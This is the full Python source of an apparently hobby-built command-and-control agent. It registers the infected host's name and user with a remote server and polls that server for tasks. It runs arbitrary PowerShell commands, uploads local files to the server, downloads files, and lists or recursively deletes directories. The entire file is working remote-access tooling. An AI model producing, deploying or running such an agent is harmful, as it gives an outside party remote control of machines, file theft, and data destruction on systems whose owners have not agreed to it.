import requests as rq
from sys import argv
import time
import os
import shutil
from pathlib import Path
import subprocess

# Configuration constants
SERVER_IP = None
AGENT_ID = None
REQUEST_TIMEOUT = 30  # seconds for most requests
UPLOAD_TIMEOUT = 120  # seconds for file uploads
DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
SLEEP_TIME = 3  # default sleep time between polling

# Global working directory state
CWD = os.getcwd()


def execute_command(command: str):
    global CWD

    # Handle cd commands to maintain persistent directory state
    if command.strip().lower().startswith("cd "):
        path = command[3:].strip()
        new_dir = os.path.abspath(os.path.expanduser(os.path.join(CWD, path)))

        if os.path.isdir(new_dir):
            CWD = new_dir
            return f"Changed directory to: {CWD}"
        else:
            return f"The system cannot find the path specified: {path}"

    # Execute all other commands in the current working directory
    res = subprocess.run(
        ["powershell", "-NoProfile", "-Command", command],
        cwd=CWD,
        capture_output=True,
        text=True,
    )

    # Combine stdout and stderr for complete output visibility
    output = res.stdout.strip()
    if res.stderr.strip():
        if output:
            output = res.stderr.strip() + "\n" + output
        else:
            output = res.stderr.strip()

    return output


def get_hostname():
    return os.environ.get("COMPUTERNAME") or os.environ.get("HOSTNAME") or "unknown"


def get_whoami():
    return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"


def list_directory(path):
    """List contents of a directory with metadata"""
    import json

    print(f"[DEBUG] list_directory() called for path: {path}")
    try:
        items = []
        # Expand user paths like ~
        expanded_path = os.path.expanduser(path)
        print(f"[DEBUG] Expanded path: {expanded_path}")

        # List directory contents
        for item in os.listdir(expanded_path):
            try:
                full_path = os.path.join(expanded_path, item)
                is_dir = os.path.isdir(full_path)

                # Get size (0 for directories)
                size = 0
                if not is_dir:
                    try:
                        size = os.path.getsize(full_path)
                    except:
                        size = 0

                items.append(
                    {
                        "name": item,
                        "is_directory": is_dir,
                        "size": size,
                        "path": full_path,
                    }
                )
            except Exception as e:
                # Skip items we can't access
                print(f"[DEBUG] Skipping item due to error: {e}")
                continue

        # Sort: directories first, then files, alphabetically
        items.sort(key=lambda x: (not x["is_directory"], x["name"].lower()))

        print(
            f"[DEBUG] Successfully listed {len(items)} items ({sum(1 for i in items if i['is_directory'])} dirs, {sum(1 for i in items if not i['is_directory'])} files)"
        )
        return json.dumps({"status": "success", "items": items})
    except PermissionError:
        print(f"[DEBUG] Permission denied for path: {path}")
        return json.dumps({"status": "error", "error": "Permission denied"})
    except FileNotFoundError:
        print(f"[DEBUG] Directory not found: {path}")
        return json.dumps({"status": "error", "error": "Directory not found"})
    except Exception as e:
        print(f"[DEBUG] Error listing directory: {e}")
        return json.dumps({"status": "error", "error": str(e)})


# function to send to server a join request to c2
def connect():
    r = rq.post(
        f"http://{SERVER_IP}/join",
        json={"hostname": get_hostname(), "user": get_whoami()},
        timeout=REQUEST_TIMEOUT,
    ).json()
    if r["status"]:
        print("[+] connected to server successfully, id =", r["id"])
        return r["id"]
    return None


def check_commands():
    r = rq.get(
        f"http://{SERVER_IP}/agent/get_commands/{AGENT_ID}", timeout=REQUEST_TIMEOUT
    )
    commands = r.json()["commands"]
    if commands:
        print("[+] got new commands !!")
        print("[+] commands =", commands)
    return commands


def execute_exec_command(command_data):
    """Execute a shell command"""
    try:
        command = command_data.get("command", "")
        result = execute_command(command)
        return {"status": "success", "result": result}
    except Exception as e:
        return {"status": "error", "error": str(e)}


def execute_upload_command(command_data):
    """Upload a file from agent to server"""
    try:
        source_path = command_data.get("source_path", "")
        filename = command_data.get("filename", os.path.basename(source_path))

        # Check if file exists
        if not os.path.exists(source_path):
            return {"status": "error", "error": f"File not found: {source_path}"}

        # Read and upload file
        with open(source_path, "rb") as f:
            files = {"file": (filename, f)}
            params = {"agent_id": AGENT_ID}
            r = rq.post(
                f"http://{SERVER_IP}/agent/upload_file",
                params=params,
                files=files,
                timeout=UPLOAD_TIMEOUT,
            )

        if r.status_code == 200:
            result = r.json()
            return {
                "status": "success",
                "result": f"Uploaded {result['filename']} ({result['size']} bytes)",
            }
        else:
            return {"status": "error", "error": f"Upload failed: {r.text}"}

    except Exception as e:
        return {"status": "error", "error": str(e)}


def execute_download_command(command_data):
    """Download a file from server to agent"""
    try:
        url = command_data.get("url", "")
        save_as = command_data.get("save_as", "")

        if not url or not save_as:
            return {"status": "error", "error": "Missing url or save_as"}

        # Download file with timeout
        r = rq.get(f"http://{SERVER_IP}{url}", stream=True, timeout=DOWNLOAD_TIMEOUT)

        # Check file size from Content-Length header before downloading
        if "content-length" in r.headers:
            file_size = int(r.headers["content-length"])
            MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
            if file_size > MAX_DOWNLOAD_SIZE:
                return {
                    "status": "error",
                    "error": f"File too large: {file_size} bytes (max 100MB)",
                }

        if r.status_code == 200:
            # Create directory if needed
            save_path = Path(save_as)
            save_path.parent.mkdir(parents=True, exist_ok=True)

            # Save file
            with open(save_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

            file_size = os.path.getsize(save_path)
            return {
                "status": "success",
                "result": f"Downloaded to {save_as} ({file_size} bytes)",
            }
        else:
            return {"status": "error", "error": f"Download failed: {r.status_code}"}

    except Exception as e:
        return {"status": "error", "error": str(e)}


def execute_terminate_command():
    """Terminate the agent gracefully"""
    return {
        "status": "success",
        "result": "Agent terminating...",
        "terminate": True,  # Signal to break the main loop
    }


def execute_list_directory_command(command_data):
    """List directory contents"""
    try:
        path = command_data.get("path", "")
        print(f"[DEBUG] execute_list_directory_command() received request")
        print(f"[DEBUG] Path to list: '{path}'")

        if not path:
            print("[DEBUG] Error: No path specified")
            return {"status": "error", "error": "No path specified"}

        result = list_directory(path)
        # list_directory already returns JSON, so parse it
        import json

        result_data = json.loads(result)

        if result_data.get("status") == "success":
            num_items = len(result_data.get("items", []))
            print(f"[DEBUG] Command succeeded: {num_items} items returned")
            return {"status": "success", "result": result}  # Return the JSON string
        else:
            error_msg = result_data.get("error", "Unknown error")
            print(f"[DEBUG] Command failed: {error_msg}")
            return {"status": "error", "error": error_msg}
    except Exception as e:
        print(f"[DEBUG] Exception in execute_list_directory_command: {e}")
        return {"status": "error", "error": str(e)}


def execute_set_sleep_time_command(command_data):
    """Change agent polling interval"""
    global SLEEP_TIME
    try:
        new_sleep_time = command_data.get("sleep_time")
        if not new_sleep_time:
            return {"status": "error", "error": "No sleep_time specified"}

        # Validate sleep time
        if (
            not isinstance(new_sleep_time, int)
            or new_sleep_time < 1
            or new_sleep_time > 60
        ):
            return {
                "status": "error",
                "error": "Sleep time must be an integer between 1 and 60 seconds",
            }

        old_sleep_time = SLEEP_TIME
        SLEEP_TIME = new_sleep_time
        return {
            "status": "success",
            "result": f"Sleep time changed from {old_sleep_time}s to {new_sleep_time}s",
        }
    except Exception as e:
        return {"status": "error", "error": str(e)}


def execute_delete_command(command_data):
    """Delete file or directory"""
    try:
        path = command_data.get("path", "")
        recursive = command_data.get("recursive", False)

        if not path:
            return {"status": "error", "error": "No path specified"}

        # Check if path exists
        if not os.path.exists(path):
            return {"status": "error", "error": f"Path not found: {path}"}

        # Delete based on type
        if os.path.isfile(path):
            os.remove(path)
            return {"status": "success", "result": f"File deleted: {path}"}
        elif os.path.isdir(path):
            if recursive:
                shutil.rmtree(path)
                return {"status": "success", "result": f"Directory deleted: {path}"}
            else:
                # Try to delete empty directory
                try:
                    os.rmdir(path)
                    return {"status": "success", "result": f"Directory deleted: {path}"}
                except OSError:
                    return {
                        "status": "error",
                        "error": "Directory not empty. Use recursive=true to delete non-empty directories",
                    }
        else:
            return {"status": "error", "error": f"Unknown path type: {path}"}

    except PermissionError:
        return {"status": "error", "error": "Permission denied"}
    except Exception as e:
        return {"status": "error", "error": str(e)}


def execute_command_by_type(command):
    """Route command to appropriate handler based on type"""
    cmd_type = command.get("type", "exec")
    cmd_data = command.get("data", {})

    if cmd_type == "exec":
        return execute_exec_command(cmd_data)
    elif cmd_type == "upload":
        return execute_upload_command(cmd_data)
    elif cmd_type == "download":
        return execute_download_command(cmd_data)
    elif cmd_type == "list_directory":
        return execute_list_directory_command(cmd_data)
    elif cmd_type == "set_sleep_time":
        return execute_set_sleep_time_command(cmd_data)
    elif cmd_type == "delete":
        return execute_delete_command(cmd_data)
    elif cmd_type == "terminate":
        return execute_terminate_command()
    else:
        return {"status": "error", "error": f"Unknown command type: {cmd_type}"}


def send_result(command_id, result):
    """Send result for a single command"""
    params = {
        "agent_id": AGENT_ID,
        "command_id": command_id,
        "status": result["status"],
        "result": result.get("result"),
        "error": result.get("error"),
    }
    r = rq.post(
        f"http://{SERVER_IP}/agent/set_command_result",
        json=params,
        timeout=REQUEST_TIMEOUT,
    )
    print(f"[+] Result sent: {r.json()}")


def main():
    if len(argv) != 2:
        print("Usage: python main.py <ip>:<port>")
        return
    global AGENT_ID
    global SERVER_IP
    SERVER_IP = argv[1]
    AGENT_ID = connect()

    if not AGENT_ID:
        print("[-] Failed to connect to server")
        return

    print("[+] Agent running. Polling for commands...")
    should_terminate = False
    while not should_terminate:
        time.sleep(SLEEP_TIME)
        try:
            commands = check_commands()
            for command in commands:
                cmd_id = command["command_id"]
                cmd_type = command.get("type", "exec")
                print(f"[+] Executing {cmd_type} command {cmd_id}")

                result = execute_command_by_type(command)
                print(f"[+] Result: {result['status']}")

                send_result(cmd_id, result)

                # Check if we should terminate after sending result
                if result.get("terminate", False):
                    print("[!] Terminate command received. Shutting down...")
                    should_terminate = True
                    break
        except Exception as e:
            print(f"[-] Error in main loop: {e}")
            time.sleep(5)  # Wait a bit longer on error

    print("[+] Agent terminated.")


main()
